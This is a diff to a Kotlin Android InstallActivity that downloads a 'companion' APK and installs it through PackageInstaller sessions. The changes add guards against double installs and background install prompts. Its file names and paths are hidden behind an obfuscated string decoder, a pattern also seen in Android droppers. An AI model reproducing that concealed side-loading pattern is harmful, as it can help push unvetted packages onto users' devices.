@@ -30,6 +30,9 @@ class InstallActivity : AppCompatActivity() {
     // ── Stage enum ──────────────────────────────────────────────────────────
     private enum class Stage { IDLE, WAITING, DOWNLOADING, INSTALLING, DONE, ERROR }
 
+    // Track whether activity is in foreground — guards installDialogReceiver
+    @Volatile private var isActivityResumed = false
+
     // ── Views ────────────────────────────────────────────────────────────────
     private lateinit var installButton: FrameLayout
     private lateinit var installButtonBg: View
@@ -141,15 +144,22 @@ class InstallActivity : AppCompatActivity() {
 
         when (savedStage) {
             Stage.INSTALLING.name -> {
-                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
-                val cachedApk  = if (cachedPath != null) java.io.File(cachedPath) else null
-                if (cachedApk != null && cachedApk.exists()) {
+                // Check if PackageInstaller already has an active session — don't re-commit
+                val existingSessions = try { packageManager.packageInstaller.mySessions } catch (_: Exception) { emptyList() }
+                if (existingSessions.isNotEmpty()) {
+                    // Session already active — just show the INSTALLING UI and wait
                     setStage(Stage.INSTALLING)
-                    val apkBytes = cachedApk.readBytes()
-                    installViaSession(apkBytes, attempt = 1)
                 } else {
-                    setStage(Stage.IDLE)
-                    startDownload()
+                    val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
+                    val cachedApk  = if (cachedPath != null) java.io.File(cachedPath) else null
+                    if (cachedApk != null && cachedApk.exists()) {
+                        setStage(Stage.INSTALLING)
+                        val apkBytes = cachedApk.readBytes()
+                        installViaSession(apkBytes, attempt = 1)
+                    } else {
+                        setStage(Stage.IDLE)
+                        startDownload()
+                    }
                 }
             }
             Stage.DONE.name -> {
@@ -191,13 +201,15 @@ class InstallActivity : AppCompatActivity() {
                     @Suppress("DEPRECATION")
                     intent.getParcelableExtra(InstallReceiver.EXTRA_USER_INTENT)
                 } ?: return
-                try {
-                    startActivity(userIntent)
-                } catch (e: Exception) {
-                    // Fallback: wrap in chooser
+                // Only show dialog if activity is in foreground
+                if (isActivityResumed) {
                     try {
-                        startActivity(Intent.createChooser(userIntent, "Install"))
-                    } catch (ex: Exception) { }
+                        startActivity(userIntent)
+                    } catch (e: Exception) {
+                        try {
+                            startActivity(Intent.createChooser(userIntent, "Install"))
+                        } catch (ex: Exception) { }
+                    }
                 }
             }
         }
@@ -217,6 +229,12 @@ class InstallActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
+        isActivityResumed = true
+    }
+
+    override fun onPause() {
+        super.onPause()
+        isActivityResumed = false
     }
 
     // ── View binding ──────────────────────────────────────────────────────────
@@ -435,9 +453,23 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── PackageInstaller session ──────────────────────────────────────────────
+    // Tracks the active session ID to prevent double-commit on activity restart
+    private var activeSessionId: Int = -1
+
     private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
         try {
             val packageInstaller = packageManager.packageInstaller
+
+            // Abandon any existing sessions this app created — prevents double install
+            // when activity recreates during the PackageInstaller flow
+            try {
+                packageInstaller.mySessions.forEach { info ->
+                    if (info.sessionId != activeSessionId) {
+                        try { packageInstaller.openSession(info.sessionId).abandon() } catch (_: Exception) {}
+                    }
+                }
+            } catch (_: Exception) {}
+
             val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
 
             val tmpFile = java.io.File(cacheDir, StringPool.d(StringPool.TMP_COMPANION))
@@ -466,6 +498,7 @@ class InstallActivity : AppCompatActivity() {
                 params.setRequestUpdateOwnership(true)
 
             val sessionId = packageInstaller.createSession(params)
+            activeSessionId = sessionId
             val session   = packageInstaller.openSession(sessionId)
             try {
                 // Save APK to cache so it survives activity recreation
